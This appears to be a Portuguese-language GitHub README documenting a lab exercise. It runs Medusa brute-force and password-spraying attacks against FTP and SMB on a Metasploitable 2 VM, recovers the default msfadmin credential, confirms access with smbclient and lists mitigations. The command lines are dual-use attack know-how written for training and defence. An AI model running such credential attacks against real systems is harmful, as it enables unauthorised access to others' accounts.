# Projeto Prático: Ataque de Força Bruta com Medusa e Kali Linux

Este repositório documenta a execução de um projeto prático de simulação de ataques de força bruta e password spraying, utilizando o Kali Linux e a ferramenta Medusa contra um ambiente vulnerável controlado (Metasploitable 2).

## Objetivos
- Configurar um laboratório isolado com Kali Linux e Metasploitable 2.
- Executar ataques de força bruta contra serviços FTP e SMB utilizando o Medusa.
- Validar os acessos obtidos utilizando ferramentas de linha de comando (`smbclient`).
- Propor medidas de mitigação para proteger infraestruturas corporativas.

## Ambiente e Ferramentas
- **Atacante:** Kali Linux (IP: `192.168.56.103`)
- **Alvo:** Metasploitable 2 (IP: `192.168.56.101`)
- **Rede:** VirtualBox Host-Only Adapter
- **Ferramentas:** `arp-scan`, `medusa`, `smbclient`

## Execução do Projeto

### 1. Criação das Wordlists
Foram criadas listas de usuários (`users.txt`) e senhas (`passwords.txt`) contendo credenciais padrão e fracas frequentemente encontradas em configurações de fábrica.
**Obs.: Ambos os arquivos (`users.txt` e `passwords.txt`) estão anexados na raiz deste repositório para consulta e reprodução dos testes.**

### 2. Ataque ao Serviço FTP
Comando utilizado para auditar o serviço FTP na porta 21:
\`\`\`bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
\`\`\`
**Resultado:** Credencial `msfadmin:msfadmin` descoberta com sucesso.

### 3. Ataque ao Serviço SMB
Comando utilizado para simular password spraying no serviço SMB:
\`\`\`bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt
\`\`\`

### 4. Validação de Acesso
Para comprovar o acesso via SMB com as credenciais obtidas, foi realizada a enumeração dos compartilhamentos:
\`\`\`bash
smbclient -L \\\\192.168.56.101 -U msfadmin
\`\`\`
O acesso foi concedido, confirmando a vulnerabilidade.

## Medidas de Mitigação e Prevenção
Para evitar que infraestruturas reais sejam comprometidas por este tipo de ataque, recomendo as seguintes práticas:
1. **Políticas de Senhas Fortes:** Exigir complexidade, comprimento mínimo e expiração periódica.
2. **Bloqueio de Contas (Account Lockout):** Implementar bloqueio temporário após um número específico de tentativas falhas (mitiga a força bruta direta).
3. **Múltiplo Fator de Autenticação (MFA):** Essencial para proteger contas mesmo que a senha seja comprometida.
4. **Monitoramento e Alertas (IDS/IPS):** Configurar regras para detectar e bloquear IPs que gerem alto volume de falhas de autenticação em um curto espaço de tempo.
5. **Desativação de Serviços Desnecessários:** Serviços legados como FTP sem criptografia devem ser substituídos por alternativas seguras (SFTP).
